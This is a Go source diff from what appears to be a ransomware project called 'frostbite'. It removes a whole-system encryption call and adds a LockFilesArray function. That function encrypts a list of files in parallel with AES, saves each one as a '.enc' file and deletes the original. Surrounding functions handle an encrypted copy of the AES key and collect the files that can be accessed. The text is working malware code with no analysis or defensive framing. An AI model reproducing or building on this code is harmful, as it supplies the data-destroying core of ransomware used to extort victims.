@@ -7,8 +7,8 @@ import (
 	"sync"
 
 	cf "frostbite.com/coldfire"
+	enc "frostbite.com/encryption"
 	scan "frostbite.com/tools/scan"
-	"frostbite.com/tools/system"
 )
 
 var pl = fmt.Println
@@ -44,9 +44,6 @@ func RunEncryptForCurrentDir(encryptedAESKey []byte, AESKey []byte) (fileList []
 	return fileList
 }
 
-func RunEncryptForSystem() {
-	system.WholeSystemEncrypt()
-}
 func GetListOfAccessibleFiles(fileList []string) []string {
 	ch := make(chan string)
 	wg := sync.WaitGroup{}
@@ -72,4 +69,23 @@ func GetListOfAccessibleFiles(fileList []string) []string {
 		fileListWithAccess = append(fileListWithAccess, file)
 	}
 	return fileListWithAccess
+}
+
+func LockFilesArray(filesToEncrypt []string, AESKey []byte, encryptedAESKey []byte) {
+	//scan only non hidden directories
+	runtime.GOMAXPROCS(runtime.NumCPU() / 2)
+
+	wg := sync.WaitGroup{}
+	wg.Add(len(filesToEncrypt))
+
+	for _, filePath := range filesToEncrypt {
+		go func(filePath string) {
+			encryptedFileData := enc.EncryptFileAES(AESKey, filePath)
+			os.WriteFile(filePath+".enc", encryptedFileData, 0644)
+			os.Remove(filePath)
+			wg.Done()
+		}(filePath)
+	}
+	wg.Wait()
+
 }
